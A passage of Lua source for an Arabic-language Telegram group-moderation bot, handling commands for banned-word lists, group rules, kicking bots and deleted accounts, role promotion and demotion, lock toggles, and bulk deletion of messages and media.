database:del(bot_id.."DRAGON1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."DRAGON1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_," ◉ تم مسح قائمه المنع")  
end

if text == "قائمه المنع" and Manager(msg) then   
local list = database:smembers(bot_id.."DRAGON1:List:Filter"..msg.chat_id_)  
t = "\n ◉ قائمة المنع \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do  
local DRAGON_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." ← {"..DRAGON_Msg.."}\n"    
end  
if #list == 0 then  
t = " ◉ لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
end  

if text == 'مسح قائمه منع المتحركات' and Manager(msg) then     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ◉ تم مسح قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' and Manager(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ◉ تم مسح قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' and Manager(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ◉ تم مسح قائمه منع الملصقات')  
end
------------------

if text == 'مسح كليشه المطور' and DevSoFi(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ◉ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevSoFi(msg) then
database:set(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,' ◉ ارسل الكليشه الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ◉ تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ◉ تم حفظ كليشة المطور')
return false
end
-----------------
if text == 'تعين الايدي' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
 ◉ ارسل الان النص
 ◉ يمكنك اضافه :
 ◉ `#rdphoto` ← تعليق الصوره
 ◉ `#username` ← اسم 
 ◉ `#msgs` ← عدد رسائل 
 ◉ `#photos` ← عدد صور 
 ◉ `#id` ← ايدي 
 ◉ `#auto` ← تفاعل 
 ◉ `#stast` ← موقع  
 ◉ `#edit` ← السحكات
 ◉ `#game` ← النقاط
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'مسح الايدي' or text == 'مسح الايدي' then
if Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id.."KLISH:ID"..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم ازالة كليشة الايدي')
end
return false  
end 

if database:get(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ◉ تم الغاء تعين الايدي") 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
database:set(bot_id.."KLISH:ID"..msg.chat_id_,CHENGER_ID)
send(msg.chat_id_, msg.id_,' ◉ تم تعين الايدي')    
end

if text == 'طرد البوتات' and Mod(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " ◉ لا توجد بوتات في الجروب")
else
local t = ' ◉ عدد البوتات هنا >> {'..c..'}\n ◉ عدد البوتات التي هي ادمن >> {'..x..'}\n ◉ تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
end
if text == ("كشف البوتات") and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n ◉ قائمة البوتات الموجوده \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = ' {◉ }'
end
text = text..">> [@"..ta.username_..']'..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, " ◉ لا توجد بوتات في الجروب")
return false 
end
if #admins == i then 
local a = '\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = ' ◉ عدد البوتات التي هي ادمن >> {'..t..'}\n ◉ ملاحضه علامة ال (◉) تعني ان البوت ادمن \n'
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, " ◉ تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_," ◉ تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == 'ضع قوانين' or text == 'وضع قوانين' then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_," ◉ ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'مسح القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_," ◉ تم ازالة قوانين الجروب")  
database:del(bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == 'القوانين' then 
local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_," ◉ لا توجد قوانين")   
end    
end
if text == 'قفل التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التفليش ')  
end,nil)   
end
if text == 'فتح التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح التفليش ')  
end,nil)   
end
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Mod(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Group_Kick(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,' ◉ تم طرد المحذوفين')
end,nil)
end
end
if text == 'الصلاحيات' and Mod(msg) then 
local list = database:smembers(bot_id..'Coomds'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,' ◉ لا توجد صلاحيات مضافه')
return false
end
t = "\n ◉ قائمة الصلاحيات المضافه \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..''..k..'- '..v..' ← ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text and text:match("^اضف صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, " ◉ ارسل نوع الرتبه \n ◉ {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
if text and text:match("^مسح صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "* ◉ تم مسح الصلاحيه *\n") 
end
if database:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"* ◉ تم الغاء الامر *\n") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* ◉ تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n ◉ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* ◉ تستطيع اضافه صلاحيات {مميز - عضو} \n ◉ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* ◉  تستطيع اضافه صلاحيات {عضو} \n ◉ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضو' then
local textn = database:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, " ◉ تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match('رفع (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('رفع (.*)')
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('تنزيل (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('تنزيل (.*)')
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉ م تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉ تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉  تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'..'\n ◉ تم تنزيله من '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('^رفع (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
end
else
info = ' ◉ المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match('^تنزيل (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'so_alfaa ')..')'..'\n ◉ تم تنريله من '..text1[2]..'')   
end
else
info = ' ◉ المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if text == "مسح رسايلي" or text == "مسح رسائلي" or text == "مسح رسايلي" or text == "مسح رسائلي" then  
send(msg.chat_id_, msg.id_,' ◉ تم مسح رسائلك'  )  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if text == "رسايلي" or text == "رسائلي" or text == "msg" then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' ◉ عدد رسائلك ← { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
if text == 'تفعيل الاذاعه' and DevSoFi(msg) then  
if database:get(bot_id..'Bc:Bots') then
database:del(bot_id..'Bc:Bots') 
Text = '\n ◉ تم تفعيل الاذاعه' 
else
Text = '\n ◉ بالتاكيد تم تفعيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاذاعه' and DevSoFi(msg) then  
if not database:get(bot_id..'Bc:Bots') then
database:set(bot_id..'Bc:Bots',true) 
Text = '\n ◉ تم تعطيل الاذاعه' 
else
Text = '\n ◉  بالتاكيد تم تعطيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل التواصل' and DevSoFi(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n ◉ تم تفعيل التواصل' 
else
Text = '\n ◉ بالتاكيد تم تفعيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل' and DevSoFi(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n ◉ تم تعطيل التواصل' 
else
Text = '\n ◉ بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي' and DevSoFi(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n ◉ تم تفعيل البوت الخدمي' 
else
Text = '\n ◉ بالتاكيد تم تفعيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي' and DevSoFi(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n ◉ تم تعطيل البوت الخدمي' 
else
Text = '\n ◉ بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match('^مسح (%d+)$') and Manager(msg) then
if not database:get(bot_id..'S00F4:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local num = tonumber(text:match('^مسح (%d+)$')) 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ اشترك اولا بلقناه  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if num > 2000 then 
send(msg.chat_id_, msg.id_,'◉تستطيع المسح 2000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,'◉ تم مسح {'..num..'}')  
database:setex(bot_id..'S00F4:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
if text == "مسح الميديا" and Manager(msg) then
msgm = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
msgm[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = msgm},function(arg,data)
new = 0
msgm2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
msgm2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,msgm2)
end,nil)  
send(msg.chat_id_, msg.id_,"◉ تم مسح جميع الميديا")
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) and msg.reply_to_message_id_ == 0 then
database:sadd(bot_id.."S00F4:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."S00F4:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "◉ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."S00F4:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = "◉ لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("عدد الميديا") and cleaner(msg) then  
local num = database:smembers(bot_id.."S00F4:allM"..msg.chat_id_)
for k,v in pairs(num) do
local numl = v
if numl then
l = "◉ عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = "◉ لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, l)
end
if text == "مسح التعديل" and Manager(msg) then
Msgs = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Msgs[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data)
new = 0
Msgs2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
